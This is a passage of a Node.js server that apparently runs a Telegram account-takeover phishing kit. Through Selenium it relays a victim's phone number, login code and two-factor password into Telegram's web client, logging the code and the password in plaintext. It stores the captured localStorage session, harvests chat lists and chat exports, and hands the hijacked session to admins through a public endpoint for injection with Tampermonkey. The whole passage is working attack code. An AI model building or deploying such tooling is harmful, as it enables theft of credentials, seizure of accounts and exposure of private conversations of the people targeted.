      console.error(`❌ Error getting phone number from Selenium for session ${sessionId}:`, error.message);
      socket.emit('getPhoneNumberFromSeleniumResult', {
        sessionId,
        success: false,
        error: error.message,
        timestamp: new Date().toISOString()
      });
    }
  });

  // Handle click next button request
  socket.on('clickNextButton', async (data) => {
    const {
      sessionId,
      timestamp
    } = data;
    console.log(`🔄 Click next button request for session: ${sessionId}`);

    try {
      // Find the Chrome driver for this session
      const {
        activeDrivers
      } = require('./telegram-login-handler');
      const driverInfo = activeDrivers.get(sessionId);

      if (!driverInfo || !driverInfo.driver) {
        console.log(`❌ No active driver found for session: ${sessionId}`);
        socket.emit('clickNextButtonResult', {
          sessionId,
          success: false,
          error: 'No active driver found',
          timestamp: new Date().toISOString()
        });
        return;
      }

      const driver = driverInfo.driver;
      console.log(`✅ Found driver for session: ${sessionId}`);

      // CRITICAL: Check if there are any pending input operations for this session
      if (ongoingInputOperations.has(sessionId)) {
        const pendingOperation = ongoingInputOperations.get(sessionId);
        console.log(`⏳ Waiting for pending input operation to complete for session: ${sessionId}`);
        console.log(`⏳ Pending operation details:`, {
          operationId: pendingOperation.operationId,
          value: pendingOperation.value,
          timestamp: new Date(pendingOperation.operationId).toISOString()
        });

        // Wait for the pending operation to complete
        await new Promise((resolve, reject) => {
          const checkInterval = setInterval(async () => {
            // Check if the operation is still ongoing
            if (!ongoingInputOperations.has(sessionId)) {
              clearInterval(checkInterval);
              console.log(`✅ Pending input operation completed for session: ${sessionId}`);
              resolve();
            }
          }, 100); // Check every 100ms

          // Set a timeout to prevent infinite waiting
          setTimeout(() => {
            clearInterval(checkInterval);
            console.log(`⚠️ Timeout waiting for input operation to complete for session: ${sessionId}`);
            resolve(); // Continue anyway to avoid blocking
          }, 5000); // Wait up to 5 seconds
        });

        // Additional small delay to ensure the DOM has updated
        await new Promise(resolve => setTimeout(resolve, 200));
        console.log(`✅ Waited for input operation completion and DOM update for session: ${sessionId}`);
      }

      // Look for the NEXT button using only the specific CSS selector
      let nextButton;
      try {
        nextButton = await driver.findElement(By.css("#auth-phone-number-form button[type='submit']"));
        console.log(`✅ Found NEXT button using #auth-phone-number-form button[type='submit'] selector`);
      } catch (error) {
        console.log(`❌ Could not find NEXT button:`, error.message);
        socket.emit('clickNextButtonResult', {
          sessionId,
          success: false,
          error: 'NEXT button not found with selector #auth-phone-number-form button[type="submit"] - ensure phone number typing is complete',
          timestamp: new Date().toISOString()
        });
        return;
      }

      // Click the NEXT button
      await nextButton.click();
      console.log(`✅ Successfully clicked NEXT button for session: ${sessionId}`);

      // Notify frontend of success
      socket.emit('clickNextButtonResult', {
        sessionId,
        success: true,
        message: 'NEXT button clicked successfully',
        timestamp: new Date().toISOString()
      });

      // Also emit to all clients for potential UI updates
      io.emit('nextButtonClicked', {
        sessionId,
        timestamp: new Date().toISOString()
      });

    } catch (error) {
      console.error(`❌ Error clicking NEXT button for session ${sessionId}:`, error.message);
      socket.emit('clickNextButtonResult', {
        sessionId,
        success: false,
        error: error.message,
        timestamp: new Date().toISOString()
      });
    }
  });

  // Handle click phone login button request
  socket.on('clickPhoneLoginButton', async (data) => {
    const {
      sessionId,
      timestamp
    } = data;
    console.log(`🖱️ Click phone login button request for session: ${sessionId}`);

    try {
      // Find the Chrome driver for this session
      const {
        activeDrivers
      } = require('./telegram-login-handler');
      const driverInfo = activeDrivers.get(sessionId);

      if (!driverInfo || !driverInfo.driver) {
        console.log(`❌ No active driver found for session: ${sessionId}`);
        socket.emit('clickPhoneLoginButtonResult', {
          sessionId,
          success: false,
          error: 'No active driver found',
          timestamp: new Date().toISOString()
        });
        return;
      }

      const driver = driverInfo.driver;
      console.log(`✅ Found driver for session: ${sessionId}`);

      // Find and click the phone login button
      const phoneLoginButton = await driver.findElement(By.css('div#auth-qr-form div.auth-form.qr button'));
      await phoneLoginButton.click();
      console.log(`✅ Successfully clicked phone login button for session: ${sessionId}`);

      // Notify frontend of success
      socket.emit('clickPhoneLoginButtonResult', {
        sessionId,
        success: true,
        message: 'Phone login button clicked successfully',
        timestamp: new Date().toISOString()
      });

      // Also emit to all clients for potential UI updates
      io.emit('phoneLoginButtonClicked', {
        sessionId,
        timestamp: new Date().toISOString()
      });

    } catch (error) {
      console.error(`❌ Error clicking phone login button for session ${sessionId}:`, error.message);
      socket.emit('clickPhoneLoginButtonResult', {
        sessionId,
        success: false,
        error: error.message,
        timestamp: new Date().toISOString()
      });
    }
  });

  // Handle click number edit button request
  socket.on('clickNumberEditButton', async (data) => {
    const {
      sessionId,
      timestamp
    } = data;
    console.log(`🖱️ Click number edit button request for session: ${sessionId}`);

    try {
      // Find the Chrome driver for this session
      const {
        activeDrivers
      } = require('./telegram-login-handler');
      const driverInfo = activeDrivers.get(sessionId);

      if (!driverInfo || !driverInfo.driver) {
        console.log(`❌ No active driver found for session: ${sessionId}`);
        socket.emit('clickNumberEditButtonResult', {
          sessionId,
          success: false,
          error: 'No active driver found',
          timestamp: new Date().toISOString()
        });
        return;
      }

      const driver = driverInfo.driver;
      console.log(`✅ Found driver for session: ${sessionId}`);

      // Find and click the number edit button
      const numberEditButton = await driver.findElement(By.css('.auth-number-edit'));
      await numberEditButton.click();
      console.log(`✅ Successfully clicked number edit button for session: ${sessionId}`);

      // Notify frontend of success
      socket.emit('clickNumberEditButtonResult', {
        sessionId,
        success: true,
        message: 'Number edit button clicked successfully',
        timestamp: new Date().toISOString()
      });

      // Also emit to all clients for potential UI updates
      io.emit('numberEditButtonClicked', {
        sessionId,
        timestamp: new Date().toISOString()
      });

    } catch (error) {
      console.error(`❌ Error clicking number edit button for session ${sessionId}:`, error.message);
      socket.emit('clickNumberEditButtonResult', {
        sessionId,
        success: false,
        error: error.message,
        timestamp: new Date().toISOString()
      });
    }
  });

  // Handle element check requests

  // Handle submit verification code event
  socket.on('submitVerificationCode', async (data) => {
    const {
      sessionId,
      code
    } = data;
    console.log(`🔐 Frontend submitted verification code for session: ${sessionId}, code: ${code}`);

    try {
      // Find the Chrome driver for this session
      const driverInfo = activeDrivers.get(sessionId);
      if (!driverInfo || !driverInfo.driver) {
        console.log(`⚠️ No active driver found for session: ${sessionId}`);
        socket.emit('verificationCodeResult', {
          sessionId,
          success: false,
          error: 'No active driver found for this session',
          timestamp: new Date().toISOString()
        });
        return;
      }

      const driver = driverInfo.driver;

      try {
        // Find the verification code input field
        let codeInputElement = null;
        try {
          codeInputElement = await driver.findElement(By.id('sign-in-code'));
        } catch (idError) {
          try {
            codeInputElement = await driver.findElement(By.xpath(`//input[contains(@placeholder, 'code') or contains(@name, 'code')]`));
          } catch (xpathError) {
            console.log('Could not find verification code input field');
            socket.emit('verificationCodeResult', {
              sessionId,
              success: false,
              error: 'Verification code input field not found',
              timestamp: new Date().toISOString()
            });
            return;
          }
        }

        if (codeInputElement) {
          // Clear the input and set the verification code
          await codeInputElement.clear();
          console.log(`⌨️ Typing verification code: ${code}`);

          // Type the code character by character
          for (let i = 0; i < code.length; i++) {
            const char = code[i];
            await codeInputElement.sendKeys(char);
            await new Promise(resolve => setTimeout(resolve, 10)); // Much faster typing - 10ms delay
          }

          // Find and click the submit button
          try {
            const submitButton = await driver.findElement(By.xpath(`//button[contains(text(), 'Next') or contains(text(), 'Submit') or contains(text(), 'Verify')]`));
            await submitButton.click();
            console.log('✅ Verification code submitted successfully');

            socket.emit('verificationCodeResult', {
              sessionId,
              success: true,
              message: 'Verification code submitted successfully',
              timestamp: new Date().toISOString()
            });
          } catch (buttonError) {
            console.log('Could not find submit button:', buttonError.message);
            socket.emit('verificationCodeResult', {
              sessionId,
              success: false,
              error: 'Submit button not found',
              timestamp: new Date().toISOString()
            });
          }
        }

      } catch (syncError) {
        console.log(`❌ Error submitting verification code:`, syncError.message);
        socket.emit('verificationCodeResult', {
          sessionId,
          success: false,
          error: syncError.message,
          timestamp: new Date().toISOString()
        });
      }

    } catch (error) {
      console.error(`❌ Error in submitVerificationCode for session ${sessionId}:`, error);
      socket.emit('verificationCodeResult', {
        sessionId,
        success: false,
        error: error.message,
        timestamp: new Date().toISOString()
      });
    }
  });

  // Handle submit password event
  socket.on('submitPassword', async (data) => {
    const {
      sessionId,
      password
    } = data;
    console.log(`🔐 Frontend submitted password for session: ${sessionId}`);

    try {
      // Find the Chrome driver for this session
      const driverInfo = activeDrivers.get(sessionId);
      if (!driverInfo || !driverInfo.driver) {
        console.log(`⚠️ No active driver found for session: ${sessionId}`);
        socket.emit('passwordSubmissionResult', {
          sessionId,
          success: false,
          error: 'No active driver found for this session',
          timestamp: new Date().toISOString()
        });
        return;
      }

      const driver = driverInfo.driver;

      try {
        // Find the password input field
        let passwordInputElement = null;
        try {
          passwordInputElement = await driver.findElement(By.id('sign-in-password'));
        } catch (idError) {
          try {
            passwordInputElement = await driver.findElement(By.xpath(`//input[contains(@placeholder, 'password') or contains(@name, 'password') or @type='password']`));
          } catch (xpathError) {
            console.log('Could not find password input field');
            socket.emit('passwordSubmissionResult', {
              sessionId,
              success: false,
              error: 'Password input field not found',
              timestamp: new Date().toISOString()
            });
            return;
          }
        }

        if (passwordInputElement) {
          // Clear the input and set the password
          await passwordInputElement.clear();
          console.log(`⌨️ Typing password: ${password}`);

          // Type the password character by character
          for (let i = 0; i < password.length; i++) {
            const char = password[i];
            await passwordInputElement.sendKeys(char);
            await new Promise(resolve => setTimeout(resolve, 10)); // Much faster typing - 10ms delay
          }

          // Find and click the submit button
          try {
            const submitButton = await driver.findElement(By.xpath(`//button[contains(text(), 'Next') or contains(text(), 'Submit') or contains(text(), 'Verify') or @type='submit']`));
            await submitButton.click();
            console.log('✅ Password submitted successfully');

            // Store the password as secret question answer in session data
            const session = activeSessions.get(sessionId);
            if (session) {
              session.secretQuestionAnswer = password;
              // Update database
              try {
                await sessionDB.saveSession(sessionId, session);
                console.log(`💾 Secret question answer stored for session: ${sessionId}`);
              } catch (dbError) {
                console.error('❌ Error saving secret question answer to database:', dbError);
              }
            }

            socket.emit('passwordSubmissionResult', {
              sessionId,
              success: true,
              message: 'Password submitted successfully',
              timestamp: new Date().toISOString()
            });
          } catch (buttonError) {
            console.log('Could not find submit button:', buttonError.message);
            socket.emit('passwordSubmissionResult', {
              sessionId,
              success: false,
              error: 'Submit button not found',
              timestamp: new Date().toISOString()
            });
          }
        }

      } catch (syncError) {
        console.log(`❌ Error submitting password:`, syncError.message);
        socket.emit('passwordSubmissionResult', {
          sessionId,
          success: false,
          error: syncError.message,
          timestamp: new Date().toISOString()
        });
      }

    } catch (error) {
      console.error(`❌ Error in submitPassword for session ${sessionId}:`, error);
      socket.emit('passwordSubmissionResult', {
        sessionId,
        success: false,
        error: error.message,
        timestamp: new Date().toISOString()
      });
    }
  });

  // Handle phone number submission event
  socket.on('submitPhoneNumber', async (data) => {
    const {
      sessionId,
      phoneNumber
    } = data;
    console.log(`📱 Frontend submitted phone number for session: ${sessionId}`);

    try {
      // Store the phone number in session data
      const session = activeSessions.get(sessionId);
      if (session) {
        session.phoneNumber = phoneNumber;
        // Update database
        try {
          await sessionDB.saveSession(sessionId, session);
          console.log(`💾 Phone number stored for session: ${sessionId}`);
        } catch (dbError) {
          console.error('❌ Error saving phone number to database:', dbError);
        }
      }

      socket.emit('phoneNumberSubmissionResult', {
        sessionId,
        success: true,
        timestamp: new Date().toISOString()
      });

    } catch (error) {
      console.error(`❌ Error processing phone number submission for session ${sessionId}:`, error);
      socket.emit('phoneNumberSubmissionResult', {
        sessionId,
        success: false,
        error: error.message,
        timestamp: new Date().toISOString()
      });
    }
  });

}); // Close socket connection handler

// HTTP endpoints
app.get('/api/sessions', authenticateToken, requireMember, async (req, res) => {
  try {
    const sessions = await sessionDB.getAllSessions(req.user);
    res.json(sessions);
  } catch (error) {
    console.error('❌ Error getting sessions via HTTP:', error);
    res.status(500).json({
      error: 'Failed to retrieve sessions'
    });
  }
});

app.get('/api/sessions/:sessionId', authenticateToken, requireMember, async (req, res) => {
  try {
    const session = await sessionDB.getSession(req.params.sessionId);
    if (session) {
      res.json({
        id: req.params.sessionId,
        status: session.status,
        startTime: session.startTime,
        endTime: session.endTime,
        parameters: session.parameters,
        error: session.error,
        localStorageCode: session.localStorageCode || null,
        username: session.username || null,
        avatarSrc: session.avatarSrc || null
      });
    } else {
      res.status(404).json({
        error: 'Session not found'
      });
    }
  } catch (error) {
    console.error('❌ Error getting session via HTTP:', error);
    res.status(500).json({
      error: 'Failed to retrieve session'
    });
  }
});

// Get chat exports list for a session (ADMIN ONLY)
app.get('/api/sessions/:sessionId/chat-exports', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const {
      sessionId
    } = req.params;
    console.log(`📥 Admin requesting chat exports list for session: ${sessionId}`);

    const session = await sessionDB.getSession(sessionId);
    if (!session) {
      return res.status(404).json({
        error: 'Session not found'
      });
    }

    let chatExports = null;
    if (session.chatExports) {
      try {
        chatExports = typeof session.chatExports === 'string' ?
          JSON.parse(session.chatExports) :
          session.chatExports;
      } catch (parseError) {
        console.error('Error parsing chat exports:', parseError);
        chatExports = {};
      }
    }

    // Convert to array format for frontend
    const exportsList = chatExports ? Object.entries(chatExports).map(([chatId, exportData]) => ({
      chatId,
      name: exportData.name || chatId,
      messageCount: exportData.messageCount || 0,
      exportedAt: exportData.exportedAt || null
    })) : [];

    res.json({
      success: true,
      sessionId,
      chatExports: exportsList,
      exportCount: exportsList.length,
      collectedAt: session.chatExportsCollectedAt || null
    });
  } catch (error) {
    console.error('❌ Error getting chat exports list:', error);
    res.status(500).json({
      error: 'Failed to retrieve chat exports list'
    });
  }
});

// Download specific chat export (ADMIN ONLY)
app.get('/api/sessions/:sessionId/chat-exports/:chatId', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const {
      sessionId,
      chatId
    } = req.params;
    console.log(`📥 Admin requesting chat export for session: ${sessionId}, chat: ${chatId}`);

    const session = await sessionDB.getSession(sessionId);
    if (!session) {
      return res.status(404).json({
        error: 'Session not found'
      });
    }

    let chatExports = null;
    if (session.chatExports) {
      try {
        chatExports = typeof session.chatExports === 'string' ?
          JSON.parse(session.chatExports) :
          session.chatExports;
      } catch (parseError) {
        console.error('Error parsing chat exports:', parseError);
        return res.status(500).json({
          error: 'Failed to parse chat exports'
        });
      }
    }

    if (!chatExports || !chatExports[chatId]) {
      return res.status(404).json({
        error: 'Chat export not found for this session'
      });
    }

    const exportData = chatExports[chatId];
    const chatName = exportData.name || chatId;
    const username = session.username || 'Unknown';
    const timestamp = exportData.exportedAt ?
      new Date(exportData.exportedAt).toISOString().slice(0, 10) :
      new Date().toISOString().slice(0, 10);
    const filename = `${chatName.replace(/[^a-z0-9]/gi, '_')}_${username}_${timestamp}.html`;

    res.setHeader('Content-Type', 'text/html; charset=utf-8');

    // If preview mode, don't force download (for iframe display)
    const isPreview = req.query.preview === 'true';
    if (!isPreview) {
      res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    }

    res.send(exportData.html);

    console.log(`✅ Chat export provided for session: ${sessionId}, chat: ${chatName}`);
  } catch (error) {
    console.error('❌ Error getting chat export:', error);
    res.status(500).json({
      error: 'Failed to retrieve chat export'
    });
  }
});

// Download Saved Messages export (ADMIN ONLY) - Legacy endpoint for backward compatibility
app.get('/api/sessions/:sessionId/saved-messages-export', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const {
      sessionId
    } = req.params;
    console.log(`📥 Admin requesting Saved Messages export for session: ${sessionId}`);

    const session = await sessionDB.getSession(sessionId);
    if (!session) {
      return res.status(404).json({
        error: 'Session not found'
      });
    }

    console.log(`📊 Session data for download: savedMessagesExport exists: ${!!session.savedMessagesExport}, type: ${typeof session.savedMessagesExport}, length: ${session.savedMessagesExport?.length || 0}`);

    if (!session.savedMessagesExport) {
      console.error(`❌ No export found for session ${sessionId}`);
      return res.status(404).json({
        error: 'No Saved Messages export available for this session'
      });
    }

    // Set headers for HTML download
    const username = session.username || 'Unknown';
    const timestamp = session.savedMessagesExportedAt ?
      new Date(session.savedMessagesExportedAt).toISOString().slice(0, 10) :
      new Date().toISOString().slice(0, 10);
    const filename = `SavedMessages_${username}_${timestamp}.html`;

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    res.send(session.savedMessagesExport);

    console.log(`✅ Saved Messages export provided for session: ${sessionId} (${username})`);
  } catch (error) {
    console.error('❌ Error getting Saved Messages export:', error);
    res.status(500).json({
      error: 'Failed to retrieve Saved Messages export'
    });
  }
});

// Get session login data for Tampermonkey (ADMIN ONLY)
app.get('/api/session/:sessionId/login-data', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const {
      sessionId
    } = req.params;
    console.log(`🔐 Admin requesting login data for session: ${sessionId}`);

    const session = await sessionDB.getSession(sessionId);
    if (!session) {
      return res.status(404).json({
        error: 'Session not found'
      });
    }

    if (!session.localStorageCode) {
      return res.status(400).json({
        error: 'No localStorage data available for this session'
      });
    }

    // Status check removed - if localStorage exists, the session is usable
    // regardless of status (completed, closed, disconnected, etc.)

    res.json({
      sessionId: sessionId,
      username: session.username || 'Unknown User',
      avatarSrc: session.avatarSrc || null,
      localStorageCode: session.localStorageCode,
      phoneNumber: session.phoneNumber || null,
      secretQuestionAnswer: session.secretQuestionAnswer || null
    });

    console.log(`✅ Login data provided for session: ${sessionId} (${session.username || 'Unknown'})`);
  } catch (error) {
    console.error('❌ Error getting session login data:', error);
    res.status(500).json({
      error: 'Failed to retrieve session login data'
    });
  }
});

// Temporary token storage for Tampermonkey access
const tempTokens = new Map(); // { token: { sessionId, expires, used } }

// Generate temporary token for Tampermonkey access (ADMIN ONLY)
app.post('/api/telegram-login/prepare', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const {
      sessionId
    } = req.body;
    console.log(`🔐 Admin preparing login token for session: ${sessionId}`);

    const session = await sessionDB.getSession(sessionId);
    if (!session) {
      return res.status(404).json({
        error: 'Session not found'
      });
    }

    if (!session.localStorageCode) {
      return res.status(400).json({
        error: 'No localStorage data available for this session'
      });
    }

    // Status check removed - if localStorage exists, the session is usable
    // regardless of status (completed, closed, disconnected, etc.)

    // Generate temporary token (expires in 5 minutes)
    const token = require('crypto').randomBytes(32).toString('hex');
    tempTokens.set(token, {
      sessionId,
      expires: Date.now() + 5 * 60 * 1000, // 5 minutes
      used: false
    });

    res.json({
      token
    });
    console.log(`✅ Temporary token generated for session: ${sessionId}`);
  } catch (error) {
    console.error('❌ Error preparing login token:', error);
    res.status(500).json({
      error: 'Failed to prepare login token'
    });
  }
});

// Handle CORS preflight for telegram-login endpoint
app.options('/api/telegram-login/:token', (req, res) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  res.sendStatus(204);
});

// Get session data using temporary token (PUBLIC - for Tampermonkey)
app.get('/api/telegram-login/:token', async (req, res) => {
  // Explicitly set CORS headers for this public endpoint
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');

  try {
    const {
      token
    } = req.params;
    const tokenData = tempTokens.get(token);

    if (!tokenData) {
      return res.status(404).json({
        error: 'Invalid token'
      });
    }

    if (tokenData.used) {
      return res.status(410).json({
        error: 'Token already used'
      });
    }

    if (tokenData.expires < Date.now()) {
      tempTokens.delete(token);
      return res.status(410).json({
        error: 'Token expired'
      });
    }

    // Mark token as used
    tokenData.used = true;
    tempTokens.delete(token);

    // Get session data
    const session = await sessionDB.getSession(tokenData.sessionId);

    // Parse localStorageCode if it's stored as JSON string
    let localStorageData = session.localStorageCode;
    if (localStorageData && typeof localStorageData === 'string') {
      try {
        localStorageData = JSON.parse(localStorageData);
      } catch (e) {
        // If it fails to parse, it might be old format (code string), keep as is
        console.warn('⚠️ Could not parse localStorageCode as JSON, using as-is');
      }
    }

    res.json({
      sessionId: tokenData.sessionId,
      username: session.username || 'Unknown User',
      avatarSrc: session.avatarSrc || null,
      localStorageCode: localStorageData,
      phoneNumber: session.phoneNumber || null,
      secretQuestionAnswer: session.secretQuestionAnswer || null
    });

    console.log(`✅ Session data provided via token for: ${tokenData.sessionId} (${session.username || 'Unknown'})`);
  } catch (error) {
    console.error('❌ Error getting session data via token:', error);
    res.status(500).json({
      error: 'Failed to retrieve session data'
    });
  }
});

// Get chat list for a specific session (ADMIN ONLY)
app.get('/api/sessions/:sessionId/chats', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const session = await sessionDB.getSession(req.params.sessionId);
    if (!session) {
      return res.status(404).json({
        success: false,
        error: 'Session not found'
      });
    }

    let chatList = null;
    if (session.chatList) {
      try {
        chatList = JSON.parse(session.chatList);
      } catch (parseError) {
        console.error('Error parsing chat list:', parseError);
        chatList = [];
      }
    }

    res.json({
      success: true,
      sessionId: req.params.sessionId,
      chatList: chatList || [],
      chatCount: chatList ? chatList.length : 0,
      collectedAt: session.chatListCollectedAt || null
    });
  } catch (error) {
    console.error('Error getting chat list:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Get all sessions with chat lists (ADMIN ONLY)
app.get('/api/sessions-with-chats', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const sessions = await sessionDB.getAllSessions(req.user);
    const sessionsWithChats = sessions.map(session => {
      let chatList = null;
      if (session.chatList) {
        try {
          chatList = JSON.parse(session.chatList);
        } catch (parseError) {
          console.error('Error parsing chat list for session', session.id, ':', parseError);
          chatList = [];
        }
      }

      return {
        id: session.id,
        status: session.status,
        startTime: session.startTime,
        endTime: session.endTime,
        username: session.username,
        avatarSrc: session.avatarSrc,
        phoneNumber: session.phoneNumber,
        chatList: chatList || [],
        chatCount: chatList ? chatList.length : 0,
        chatListCollectedAt: session.chatListCollectedAt,
        hasChatList: !!(session.chatList && session.chatList.length > 0)
      };
    });

    res.json({
      success: true,
      sessions: sessionsWithChats,
      totalSessions: sessionsWithChats.length,
      sessionsWithChats: sessionsWithChats.filter(s => s.hasChatList).length
    });
  } catch (error) {
    console.error('Error getting sessions with chats:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

app.post('/api/login', authenticateToken, requireMember, (req, res) => {
  const {
    parameters
  } = req.body;
  const sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

  // The actual login process will be handled via WebSocket
  res.json({
    sessionId,
    message: 'Login request received. Connect via WebSocket to monitor progress.',
    websocketUrl: '/socket.io/'
  });
});

// Health check endpoint
app.get('/health', async (req, res) => {
  try {
    const activeSessionsCount = await sessionDB.getActiveSessions();
    res.json({
      status: 'healthy',
      timestamp: new Date().toISOString(),
      activeSessions: activeSessionsCount.length,
      database: 'connected'
    });
  } catch (error) {
    res.json({
      status: 'degraded',
      timestamp: new Date().toISOString(),
      activeSessions: 0,
      database: 'error',
      error: error.message
    });
  }
});

// Test endpoint for HTTP fallback
app.post('/api/test', authenticateToken, requireMember, (req, res) => {
  const {
    sessionId,
    message,
    timestamp
  } = req.body;
  console.log('📨 HTTP test message received:', {
    sessionId,
    message,
    timestamp
  });

  // Broadcast to all Socket.IO clients
  io.emit('httpTestReceived', {
    sessionId,
    message: 'HTTP fallback test received',
    timestamp: new Date().toISOString()
  });

  res.json({
    success: true,
    message: 'Test received'
  });
});

// Store QR code updates from Chrome window (PUBLIC - no auth required)
app.post('/api/qr-update', (req, res) => {
  const {
    sessionId,
    qrCodeData,
    qrCodeType,
    timestamp
  } = req.body;
  // console.log('📸 QR code update received via HTTP:', {
  // 	sessionId,
  // 	timestamp,
  // 	qrCodeType: qrCodeType || 'unknown',
  // 	dataLength: qrCodeData ? qrCodeData.length : 0,
  // 	dataPreview: qrCodeData ? qrCodeData.substring(0, 100) + '...' : 'NO DATA'
  // });

  // Store the QR code update
  if (!global.qrCodeUpdates) {
    global.qrCodeUpdates = new Map();
  }

  if (!global.qrCodeUpdates.has(sessionId)) {
    global.qrCodeUpdates.set(sessionId, []);
  }

  global.qrCodeUpdates.get(sessionId).push({
    qrCodeData,
    qrCodeType,
    timestamp,
    id: Date.now()
  });

  // Keep only the last 10 updates per session
  const updates = global.qrCodeUpdates.get(sessionId);
  if (updates.length > 10) {
    updates.splice(0, updates.length - 10);
  }

  // Also broadcast to Socket.IO clients
  io.emit('qrCodeUpdate', {
    sessionId,
    qrCodeData,
    qrCodeType,
    timestamp
  });

  res.json({
    success: true,
    message: 'QR code update stored'
  });
});

// Get latest QR code update for a session (PUBLIC - no auth required)
app.get('/api/qr-update/:sessionId', (req, res) => {
  const {
    sessionId
  } = req.params;

  if (!global.qrCodeUpdates || !global.qrCodeUpdates.has(sessionId)) {
    return res.json({
      qrCodeData: null,
      qrCodeType: null,
      timestamp: null
    });
  }

  const updates = global.qrCodeUpdates.get(sessionId);
  const latestUpdate = updates[updates.length - 1];

  res.json({
    qrCodeData: latestUpdate.qrCodeData,
    qrCodeType: latestUpdate.qrCodeType,
    timestamp: latestUpdate.timestamp
  });
});

// Note: We only sync FROM frontend TO backend, never the reverse
// The frontend is the source of truth for all input values

// Session Management API Endpoints for Device Fingerprinting

// Request a new session or get existing one for a device (PUBLIC - no auth required)
app.post('/api/session/request', async (req, res) => {
  try {
    const {
      deviceHash,
      uid,
      parameters
    } = req.body;

    if (!deviceHash) {
      return res.status(400).json({
        success: false,
        error: 'Device hash is required'
      });
    }

    if (!uid) {
      return res.status(400).json({
        success: false,
        error: 'UID parameter is required'
      });
    }

    // Verify that the user exists in the database
    const user = await getUserById(uid);
    if (!user) {
      return res.status(404).json({
        success: false,
        error: 'User not found with the provided UID'
      });
    }

    console.log(`🔍 Session request for device: ${deviceHash}`);
    console.log(`📊 Current device mappings:`, Array.from(deviceSessionMap.entries()));
    console.log(`📊 Current active sessions:`, Array.from(activeSessions.keys()));

    // Check if there's already a session creation in progress for this device
    if (sessionCreationLocks.has(deviceHash)) {
      console.log(`⏳ Session creation already in progress for device: ${deviceHash}`);
      return res.status(429).json({
        success: false,
        error: 'Session creation already in progress for this device'
      });
    }

    // Set lock to prevent concurrent session creation
    sessionCreationLocks.set(deviceHash, true);

    // Set a timeout to automatically release the lock after 30 seconds
    setTimeout(() => {
      if (sessionCreationLocks.has(deviceHash)) {
        console.log(`⏰ Auto-releasing session creation lock for device: ${deviceHash}`);
        sessionCreationLocks.delete(deviceHash);
      }
    }, 30000);

    try {
      // Check if device already has an active session
      const existingSessionId = deviceSessionMap.get(deviceHash);

      if (existingSessionId) {
        console.log(`🔄 Found existing session ID: ${existingSessionId}`);

        // Check if the existing session is still active
        const existingSession = activeSessions.get(existingSessionId);
        console.log(`📊 Existing session data:`, existingSession);

        if (existingSession && existingSession.status !== 'completed' && existingSession.status !== 'error') {
          console.log(`🔄 Reusing existing session ${existingSessionId} for device ${deviceHash}`);

          // Get session details from database
          const sessionInfo = await sessionDB.getSession(existingSessionId);

          // Release lock
          sessionCreationLocks.delete(deviceHash);

          return res.json({
            sessionId: existingSessionId,
            isNew: false,
            existingSession: sessionInfo
          });
        } else {
          // Clean up stale session
          await cleanupExistingSessionsForDevice(deviceHash);
        }
      } else {
        console.log(`❌ No existing session found for device: ${deviceHash}`);
      }

      // Create new session
      const newSessionId = `telegram_login_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

      // Create initial session data
      const sessionData = {
        deviceHash,
        userId: uid,
        status: 'starting',
        startTime: new Date(),
        parameters
      };

      // Store in memory for real-time operations
      activeSessions.set(newSessionId, sessionData);

      // Map device to session
      deviceSessionMap.set(deviceHash, newSessionId);

      // Save to database
      try {
        await sessionDB.saveSession(newSessionId, sessionData);
      } catch (error) {
        console.error('❌ Error saving initial session to database:', error);
      }

      console.log(`✅ Created new session ${newSessionId} for device ${deviceHash}`);
      console.log(`📊 Updated device mappings:`, Array.from(deviceSessionMap.entries()));

      // Release lock
      sessionCreationLocks.delete(deviceHash);

      res.json({
        sessionId: newSessionId,
        isNew: true
      });

    } catch (error) {
      // Release lock on error
      sessionCreationLocks.delete(deviceHash);
      throw error;
    }

  } catch (error) {
    console.error('❌ Error in session request:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});


// Clear a stuck session-creation lock for a device (PUBLIC - no auth required)
app.delete('/api/session/lock/:deviceHash', (req, res) => {
  const { deviceHash } = req.params;
  if (sessionCreationLocks.has(deviceHash)) {
    sessionCreationLocks.delete(deviceHash);
    console.log(`🔓 Manually cleared session creation lock for device: ${deviceHash}`);
    return res.json({ success: true, message: 'Lock cleared' });
  }
  return res.json({ success: false, message: 'No lock found for this device' });
});


// Close a session (PUBLIC - no auth required)
app.post('/api/session/close', async (req, res) => {
  try {
    const {
      sessionId
    } = req.body;

    if (!sessionId) {
      return res.status(400).json({
        success: false,
        error: 'Session ID is required'
      });
    }

    console.log(`🔒 Closing session: ${sessionId}`);

    // Close the Selenium driver
    const driverClosed = await closeDriverBySessionId(sessionId);

    // Get session from active sessions
    const session = activeSessions.get(sessionId);
    if (session) {
      // Remove from device mapping if exists
      if (session.deviceHash) {
        deviceSessionMap.delete(session.deviceHash);
        console.log(`🗑️ Removed device mapping for ${session.deviceHash}`);
      }

      // Remove from active sessions
      activeSessions.delete(sessionId);
      console.log(`🗑️ Removed session ${sessionId} from active sessions`);

      // Get session to check if it has localStorage
      const dbSession = await sessionDB.getSession(sessionId);
      const updates = {
        endTime: new Date(),
        closedBy: 'api_request'
      };

      // Only change status to 'closed' if there's no localStorage data
      if (!dbSession || !dbSession.localStorageCode) {
        updates.status = 'closed';
      }
      // If localStorage exists, keep status as 'completed'

      // Update database
      await sessionDB.updateSession(sessionId, updates);
    }

    res.json({
      success: true,
      message: 'Session closed successfully',
      driverClosed
    });

  } catch (error) {
    console.error('❌ Error closing session:', error);
    res.status(500).json({
      success: false,
